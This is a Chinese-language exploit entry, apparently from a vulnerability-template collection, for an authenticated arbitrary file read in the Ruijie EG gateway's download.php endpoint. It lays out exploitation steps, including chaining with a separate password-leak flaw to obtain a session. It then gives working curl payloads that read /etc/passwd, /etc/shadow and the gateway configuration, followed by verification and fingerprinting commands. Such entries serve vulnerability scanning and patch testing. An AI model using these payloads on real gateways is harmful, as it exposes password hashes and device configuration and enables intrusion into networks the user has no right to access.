---
id: RUIJIE-EG-FILE-READ
title: 锐捷 EG 易网关 download.php 任意文件读取漏洞
product: ruijie
vendor: Ruijie (锐捷)
version_affected: "锐捷 EG 易网关（受影响版本）"
severity: HIGH
tags: [file_read, 需要认证, 国产]
fingerprint: ["Ruijie", "锐捷", "EG易网关"]
---

## 漏洞描述

锐捷 EG 易网关 `download.php` 的 `read_txt` Action 在读取文件时，未对 `file` 参数进行路径限制和过滤，经过认证的攻击者可通过指定任意文件路径读取服务器上的敏感文件，如 `/etc/passwd`、配置文件等。

## 影响版本

- 锐捷 EG 易网关（受影响版本）

## 前置条件

- 需要认证（需要有效的 `RUIJIEID` 会话和 `user` Cookie）
- 目标 HTTP 端口可访问
- `/download.php` 接口可达

## 利用步骤

1. 确认目标为锐捷 EG 易网关
2. 获取有效的登录会话（通过正常登录或结合 RUIJIE-EG-RCE 密码泄露漏洞）
3. 携带认证 Cookie 访问 `/download.php?a=read_txt&file=/etc/passwd`
4. 从 JSON 响应中获取文件内容

## Payload

### 读取 /etc/passwd

```bash
curl "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;"
```

### 读取系统配置文件

```bash
curl "http://target/download.php?a=read_txt&file=/etc/shadow" -b "RUIJIEID=SESSION_ID;user=admin;"
```

### 读取网关配置

```bash
curl "http://target/download.php?a=read_txt&file=/etc/config/config.json" -b "RUIJIEID=SESSION_ID;user=admin;"
```

## 验证方法

```bash
# 检查响应中是否包含文件内容
curl -s "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;" | grep "root:"

# 检查响应是否为有效 JSON（非错误页面）
curl -s -o /dev/null -w "%{http_code}" "http://target/download.php?a=read_txt&file=/etc/passwd" -b "RUIJIEID=SESSION_ID;user=admin;"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "Ruijie\|锐捷\|EG易网关"
curl -s -o /dev/null -w "%{http_code}" "http://target/download.php"
```
